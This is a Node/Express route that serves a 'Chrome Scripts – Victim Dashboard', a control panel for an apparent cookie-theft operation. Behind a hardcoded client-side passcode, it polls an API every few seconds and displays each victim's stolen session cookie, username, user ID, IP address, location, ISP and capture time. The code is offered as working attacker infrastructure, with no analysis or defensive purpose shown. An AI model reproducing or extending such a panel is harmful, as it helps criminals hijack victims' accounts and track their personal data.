app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <title>Chrome Scripts – Victim Dashboard</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { background:#0a0a0a; color:#fff; font-family:'Segoe UI',sans-serif; min-height:100vh; }
    .login-container { display:flex; justify-content:center; align-items:center; height:100vh; background:radial-gradient(circle at top, #1a1a2e, #0a0a0a); }
    .login-box { background:rgba(20,20,30,0.95); backdrop-filter:blur(10px); padding:3rem 2rem; border-radius:20px; box-shadow:0 0 40px rgba(0,255,200,0.3); text-align:center; width:90%; max-width:400px; }
    .login-box h1 { color:#0ff; margin-bottom:10px; font-size:2.2rem; }
    .login-box p { color:#aaa; margin-bottom:20px; }
    .login-box input { width:100%; padding:14px; background:#222; border:1px solid #333; border-radius:10px; color:#fff; font-size:16px; margin-bottom:15px; outline:none; }
    .login-box button { width:100%; padding:14px; background:linear-gradient(135deg,#0f0,#0ff); border:none; border-radius:10px; color:#000; font-weight:bold; font-size:16px; cursor:pointer; transition:0.3s; }
    .login-box button:hover { opacity:0.8; }
    .error { color:red; margin-top:10px; display:none; }

    .dashboard { display:none; padding:20px; }
    .topbar { background:#111; padding:20px; border-radius:16px; margin-bottom:30px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; box-shadow:0 0 20px rgba(0,255,200,0.2); }
    .topbar h1 { color:#0ff; font-size:1.8rem; }
    .topbar span { color:#aaa; }
    .logout-btn { background:#f33; color:#fff; border:none; padding:10px 20px; border-radius:8px; cursor:pointer; font-weight:bold; transition:0.3s; }
    .logout-btn:hover { opacity:0.8; }

    .cards { display:flex; flex-wrap:wrap; gap:20px; }
    .card { background:#151522; border:1px solid #2a2a3a; border-radius:16px; padding:20px; flex:1 1 100%; max-width:100%; box-shadow:0 0 15px rgba(0,255,200,0.08); transition:0.3s; }
    .card:hover { box-shadow:0 0 25px rgba(0,255,200,0.2); }
    .card-header { display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #2a2a3a; padding-bottom:10px; margin-bottom:15px; }
    .card-header h3 { color:#0ff; }
    .card-header small { color:#888; }
    .detail-row { display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid #222; }
    .detail-label { color:#888; font-weight:500; }
    .detail-value { color:#ddd; word-break:break-all; max-width:70%; text-align:right; }
    .cookie-val { color:#0f0; }
    .ip-val { color:#ffaa00; }

    @media(min-width:700px) {
      .card { max-width:48%; }
    }
    @media(min-width:1000px) {
      .card { max-width:32%; }
    }
  </style>
</head>
<body>
  <!-- Login screen -->
  <div class="login-container" id="loginScreen">
    <div class="login-box">
      <h1>🔐 Chrome Scripts</h1>
      <p>Secure Victim Dashboard</p>
      <input type="password" id="pass" placeholder="Enter passcode" onkeyup="if(event.key==='Enter')checkPass()">
      <button onclick="checkPass()">Unlock</button>
      <div class="error" id="error">Wrong passcode!</div>
    </div>
  </div>

  <!-- Dashboard (hidden) -->
  <div class="dashboard" id="dashboard">
    <div class="topbar">
      <div>
        <h1>Chrome Scripts – Victim Dashboard</h1>
        <span>All captured data</span>
      </div>
      <button class="logout-btn" onclick="logout()">Logout</button>
    </div>
    <div class="cards" id="cardsContainer">
      <div style="text-align:center;padding:40px;color:#888;">Loading data...</div>
    </div>
  </div>

  <script>
    const PASSCODE = '9799';

    function checkPass() {
      const input = document.getElementById('pass').value;
      if (input === PASSCODE) {
        document.getElementById('loginScreen').style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';
        loadData();
        setInterval(loadData, 5000);
      } else {
        document.getElementById('error').style.display = 'block';
      }
    }

    function logout() {
      location.reload();
    }

    async function loadData() {
      try {
        const res = await fetch('/api/victims');
        const victims = await res.json();
        const container = document.getElementById('cardsContainer');
        if (!victims.length) {
          container.innerHTML = '<div style="text-align:center;padding:40px;color:#888;">No data yet.</div>';
          return;
        }
        container.innerHTML = victims.reverse().map(v => {
          const ip = v.ipInfo?.ip || 'N/A';
          const city = v.ipInfo?.city || '?';
          const country = v.ipInfo?.country || '?';
          const isp = v.ipInfo?.isp || '?';
          const cookies = v.cookies || 'no cookie';
          const username = v.username || 'N/A';
          const userId = v.userId || 'N/A';
          const ts = v.timestamp ? new Date(v.timestamp * 1000).toLocaleString() : 'N/A';

          return \`
            <div class="card">
              <div class="card-header">
                <h3>\${username}</h3>
                <small>ID: \${userId}</small>
              </div>
              <div class="detail-row">
                <span class="detail-label">Cookie</span>
                <span class="detail-value cookie-val">\${cookies.substring(0, 40)}...</span>
              </div>
              <div class="detail-row">
                <span class="detail-label">IP Address</span>
                <span class="detail-value ip-val">\${ip}</span>
              </div>
              <div class="detail-row">
                <span class="detail-label">Location</span>
                <span class="detail-value">\${city}, \${country}</span>
              </div>
              <div class="detail-row">
                <span class="detail-label">ISP</span>
                <span class="detail-value">\${isp}</span>
              </div>
              <div class="detail-row">
                <span class="detail-label">Captured</span>
                <span class="detail-value">\${ts}</span>
              </div>
            </div>
          \`;
        }).join('');
      } catch(e) {
        console.error(e);
      }
    }
  </script>
</body>
</html>
  `);
});
